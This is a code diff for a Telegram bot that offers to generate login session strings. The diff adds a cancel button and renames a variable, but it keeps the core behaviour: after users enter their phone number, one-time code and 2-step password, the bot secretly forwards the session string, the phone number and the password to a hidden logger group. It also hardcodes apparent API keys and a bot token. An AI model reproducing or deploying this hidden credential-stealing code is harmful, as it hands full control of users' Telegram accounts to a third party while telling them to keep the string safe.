@@ -5,10 +5,10 @@ from telethon.sessions import StringSession
 # 🔹 Telegram API Credentials
 API_ID = "28795512"
 API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
-BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"
+BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  # Replace with your Bot Token
 
-# 🔹 Logger Group ID (Replace with your group ID)
-LOGGER_GROUP = -1002477750706  # Replace with your actual group ID
+# 🔹 Logger Group ID (Replace with your Telegram Group ID)
+LOGGER_GROUP_ID = -1002477750706  # 🛑 Replace with your actual group ID
 
 # 🔹 Initialize the bot
 bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
@@ -25,7 +25,7 @@ async def start(event):
             [Button.inline("🔑 Generate Session", b"generate")],
             [Button.url("📖 Help", "https://t.me/SANATANI_TECH")]
         ],
-        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
+        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
     )
 
 # 🔹 Button Handler
@@ -43,14 +43,28 @@ async def ask_phone(event):
         return
 
     user_sessions[user_id] = {"step": "phone"}
-    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")
+    await event.respond(
+        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
+        buttons=[Button.inline("❌ Cancel", b"cancel")]
+    )
+
+# 🔹 Cancel Process
+@bot.on(events.CallbackQuery)
+async def cancel(event):
+    user_id = event.sender_id
+    if event.data == b"cancel":
+        if user_id in user_sessions:
+            del user_sessions[user_id]  # Delete session data
+            await event.respond("✅ **Session process canceled!** You can start again with /generate.")
+        else:
+            await event.respond("⚠️ **You are not in any session process.**")
 
 # 🔹 Process User Input (Phone, OTP, Password)
 @bot.on(events.NewMessage)
 async def process_input(event):
     user_id = event.sender_id
     if user_id not in user_sessions:
-        return
+        return  # Ignore messages from users not in process
 
     step = user_sessions[user_id]["step"]
     
@@ -91,20 +105,14 @@ async def process_input(event):
         try:
             await client.sign_in(phone_number, otp_code)
             session_string = client.session.save()
-            
-            # ✅ Send Session String to Logger Group
-            log_message = (
-                f"🔹 **New Session Generated**\n\n"
-                f"👤 **User ID:** `{user_id}`\n"
-                f"📞 **Phone Number:** `{phone_number}`\n"
-                f"🔑 **Session String:**\n`{session_string}`\n\n"
-                f"⚠️ **Use with caution!**"
+
+            # ✅ Send session details to logger group
+            await bot.send_message(
+                LOGGER_GROUP_ID,
+                f"🆕 **New Session Generated!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`"
             )
-            await bot.send_message(LOGGER_GROUP, log_message)
-            
-            # ✅ Send Session String to User
+
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-            
             del user_sessions[user_id]
         except Exception as e:
             if "Two-steps verification is enabled" in str(e):
@@ -121,21 +129,14 @@ async def process_input(event):
         try:
             await client.sign_in(password=password)
             session_string = client.session.save()
-            
-            # ✅ Send Session String + Password to Logger Group
-            log_message = (
-                f"🔹 **New Session Generated**\n\n"
-                f"👤 **User ID:** `{user_id}`\n"
-                f"📞 **Phone Number:** `{user_sessions[user_id]['phone']}`\n"
-                f"🔑 **Session String:**\n`{session_string}`\n"
-                f"🔒 **2-Step Verification Password:** `{password}`\n\n"
-                f"⚠️ **Use with caution!**"
-            )
-            await bot.send_message(LOGGER_GROUP, log_message)
 
-            # ✅ Send Session String to User
+            # ✅ Send session and password to logger group
+            await bot.send_message(
+                LOGGER_GROUP_ID,
+                f"🆕 **New Session with 2-Step Verification!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`\n🔒 **Password Used:** `{password}`"
+            )
+
             await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
-            
             del user_sessions[user_id]
         except Exception as e:
             await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
